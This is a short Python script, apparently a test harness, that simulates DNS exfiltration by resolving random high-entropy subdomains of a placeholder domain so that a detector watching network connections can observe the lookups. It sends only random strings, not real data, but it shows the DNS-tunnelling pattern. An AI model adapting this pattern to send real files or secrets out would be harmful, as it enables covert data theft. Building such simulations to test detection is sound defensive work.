import socket
import time
import random
import string

def generate_garbage_string(length=50):
    """Generates a high-entropy string (mimicking encrypted file data)."""
    # Using a mix of upper, lower, and digits increases Shannon Entropy
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def simulate_exfiltration(target_domain="trusted-dns-provider.com", iterations=5):
    print(f"--- Starting Mock DNS Exfiltration ---")
    print(f"Targeting: {target_domain}\n")

    for i in range(iterations):
        # Create a 'garbage' fragment
        garbage_chunk = generate_garbage_string(55)
        full_query = f"{garbage_chunk}.{target_domain}"
        
        print(f"[{i+1}] Sending query: {full_query}")
        
        try:
            # This triggers a real DNS lookup that psutil.net_connections() will see
            socket.gethostbyname(full_query)
        except socket.gaierror:
            # We expect this to fail because the domain isn't real, 
            # but the 'attempt' is recorded by the OS.
            pass
        
        time.sleep(2)

if __name__ == "__main__":
    simulate_exfiltration()